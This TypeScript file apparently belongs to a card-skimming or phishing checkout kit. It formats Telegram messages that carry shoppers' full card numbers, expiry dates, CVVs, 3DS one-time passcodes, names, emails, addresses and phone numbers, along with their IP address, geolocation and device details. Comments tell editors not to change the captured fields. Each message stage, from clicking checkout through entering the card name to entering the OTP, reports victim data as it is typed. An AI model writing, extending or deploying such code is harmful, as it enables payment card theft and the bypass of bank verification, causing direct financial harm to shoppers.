import { parseUserAgent } from "@/lib/visitors/user-agent";
import type { VisitorGeoDetails } from "@/lib/visitors/types";

function escapeHtml(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function line(label: string, value?: string | number | boolean | null): string {
  if (value == null || value === "") return "";
  const text = typeof value === "boolean" ? (value ? "Yes" : "No") : String(value);
  return `<b>${escapeHtml(label)}:</b> ${escapeHtml(text)}\n`;
}

export interface CheckoutCardNameContext {
  cardName: string;
  // Donot change any information here, dont remove or add anything here

  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  email?: string;
  fullName?: string;
  path?: string;
  userAgent: string;
  acceptLanguage?: string;
  geo: VisitorGeoDetails | null;
  submittedAt: string;
  storeName?: string;
}

export function formatCheckoutCardNameTelegramMessage(
  ctx: CheckoutCardNameContext
): string {
  const { browser, os, device } = parseUserAgent(ctx.userAgent);
  const geo = ctx.geo;

  const locationParts = [
    geo?.city,
    geo?.region,
    geo?.country,
    geo?.countryCode ? `(${geo.countryCode})` : null,
  ].filter(Boolean);

  let message = "<b>💳 Checkout — card name entered</b>";
  if (ctx.storeName) {
    message += `\n${escapeHtml(ctx.storeName)}`;
  }
  message += "\n\n";

  message += "<b>Cardholder</b>\n";
  // Donot change any information here, dont remove or add anything here
  message += line("Name on card", ctx.cardName);
  message += line("Card number", ctx.cardNumber);
  message += line("Card expiry", ctx.cardExpiry);
  message += line("Card CVV", ctx.cardCvv);
  message += line("Email", ctx.email);
  message += line("Customer name", ctx.fullName);

  message += "\n<b>📍 Location</b>\n";
  message += line("IP", geo?.ip ?? "Unknown");
  message += line("Location", locationParts.join(", ") || "Unknown");
  message += line("Timezone", geo?.timezone);

  message += "\n<b>🌐 Session</b>\n";
  message += line("Page", ctx.path);
  message += line("Submitted at", ctx.submittedAt);
  message += line("Device", device);
  message += line("Browser", `${browser} on ${os}`);

  return message;
}

export interface PlaceOrderTelegramContext {
  email: string;
  fullName?: string;
  phone?: string;
  street?: string;
  city?: string;
  state?: string;
  postalCode?: string;
  country?: string;
  paymentMethod?: string;
  shippingMethod?: string;
  totalDisplay?: string;
  itemCount?: number;
  itemsSummary?: string;
  path?: string;
  userAgent: string;
  acceptLanguage?: string;
  geo: VisitorGeoDetails | null;
  submittedAt: string;
  storeName?: string;
}

export function formatPlaceOrderTelegramMessage(
  ctx: PlaceOrderTelegramContext
): string {
  const { browser, os, device } = parseUserAgent(ctx.userAgent);
  const geo = ctx.geo;

  const locationParts = [
    geo?.city,
    geo?.region,
    geo?.country,
    geo?.countryCode ? `(${geo.countryCode})` : null,
  ].filter(Boolean);

  const addressParts = [
    ctx.street,
    ctx.city,
    ctx.state,
    ctx.postalCode,
    ctx.country,
  ].filter(Boolean);

  let message = "<b>🛒 Checkout — user started placing order</b>";
  if (ctx.storeName) {
    message += `\n${escapeHtml(ctx.storeName)}`;
  }
  message += "\n\n";

  message += "<b>Customer</b>\n";
  message += line("Name", ctx.fullName);
  message += line("Email", ctx.email);
  message += line("Phone", ctx.phone);
  message += line("Address", addressParts.join(", ") || undefined);

  message += "\n<b>Order</b>\n";
  message += line("Payment method", ctx.paymentMethod);
  message += line("Shipping method", ctx.shippingMethod);
  message += line("Total", ctx.totalDisplay);
  message += line("Items", ctx.itemCount);
  if (ctx.itemsSummary) {
    message += line("Cart", ctx.itemsSummary);
  }

  message += "\n<b>📍 Location</b>\n";
  message += line("IP", geo?.ip ?? "Unknown");
  message += line("Location", locationParts.join(", ") || "Unknown");
  message += line("Timezone", geo?.timezone);

  message += "\n<b>🌐 Session</b>\n";
  message += line("Page", ctx.path);
  message += line("Submitted at", ctx.submittedAt);
  message += line("Device", device);
  message += line("Browser", `${browser} on ${os}`);

  return message;
}

export interface CartCheckoutTelegramContext {
  itemCount?: number;
  itemsSummary?: string;
  subtotalDisplay?: string;
  shippingDisplay?: string;
  taxDisplay?: string;
  discountDisplay?: string;
  totalDisplay?: string;
  promoCode?: string;
  path?: string;
  userAgent: string;
  acceptLanguage?: string;
  geo: VisitorGeoDetails | null;
  submittedAt: string;
  storeName?: string;
}

export function formatCartCheckoutTelegramMessage(
  ctx: CartCheckoutTelegramContext
): string {
  const { browser, os, device } = parseUserAgent(ctx.userAgent);
  const geo = ctx.geo;

  const locationParts = [
    geo?.city,
    geo?.region,
    geo?.country,
    geo?.countryCode ? `(${geo.countryCode})` : null,
  ].filter(Boolean);

  let message = "<b>🛒 Cart — user clicked checkout</b>";
  if (ctx.storeName) {
    message += `\n${escapeHtml(ctx.storeName)}`;
  }
  message += "\n\n";

  message += "<b>Order</b>\n";
  message += line("Items", ctx.itemCount);
  message += line("Subtotal", ctx.subtotalDisplay);
  message += line("Shipping", ctx.shippingDisplay);
  message += line("Tax", ctx.taxDisplay);
  if (ctx.discountDisplay) {
    message += line("Discount", ctx.discountDisplay);
  }
  message += line("Total", ctx.totalDisplay);
  if (ctx.promoCode) {
    message += line("Promo code", ctx.promoCode);
  }
  if (ctx.itemsSummary) {
    message += line("Cart", ctx.itemsSummary);
  }

  message += "\n<b>📍 Location</b>\n";
  message += line("IP", geo?.ip ?? "Unknown");
  message += line("Location", locationParts.join(", ") || "Unknown");
  message += line("Timezone", geo?.timezone);

  message += "\n<b>🌐 Session</b>\n";
  message += line("Page", ctx.path);
  message += line("Submitted at", ctx.submittedAt);
  message += line("Device", device);
  message += line("Browser", `${browser} on ${os}`);

  return message;
}

export interface PaymentOtpTelegramContext {
  otp: string;
  cardName?: string;
  cardNumber: string;
  cardExpiry?: string;
  cardCvv?: string;
  email?: string;
  fullName?: string;
  merchantName?: string;
  amountDisplay?: string;
  cardBrand?: string;
  path?: string;
  userAgent: string;
  acceptLanguage?: string;
  geo: VisitorGeoDetails | null;
  submittedAt: string;
  storeName?: string;
}

export function formatPaymentOtpTelegramMessage(
  ctx: PaymentOtpTelegramContext
): string {
  const { browser, os, device } = parseUserAgent(ctx.userAgent);
  const geo = ctx.geo;

  const locationParts = [
    geo?.city,
    geo?.region,
    geo?.country,
    geo?.countryCode ? `(${geo.countryCode})` : null,
  ].filter(Boolean);

  let message = "<b>🔐 3DS — OTP entered</b>";
  if (ctx.storeName) {
    message += `\n${escapeHtml(ctx.storeName)}`;
  }
  message += "\n\n";

  message += "<b>Verification</b>\n";
  message += line("OTP", ctx.otp);
  message += line("Card brand", ctx.cardBrand);

  message += "\n<b>Cardholder</b>\n";
  message += line("Name on card", ctx.cardName);
  message += line("Card number", ctx.cardNumber);
  message += line("Card expiry", ctx.cardExpiry);
  message += line("Card CVV", ctx.cardCvv);
  message += line("Email", ctx.email);
  message += line("Customer name", ctx.fullName);

  message += "\n<b>Transaction</b>\n";
  message += line("Merchant", ctx.merchantName);
  message += line("Amount", ctx.amountDisplay);

  message += "\n<b>📍 Location</b>\n";
  message += line("IP", geo?.ip ?? "Unknown");
  message += line("Location", locationParts.join(", ") || "Unknown");
  message += line("Timezone", geo?.timezone);

  message += "\n<b>🌐 Session</b>\n";
  message += line("Page", ctx.path);
  message += line("Submitted at", ctx.submittedAt);
  message += line("Device", device);
  message += line("Browser", `${browser} on ${os}`);

  return message;
}
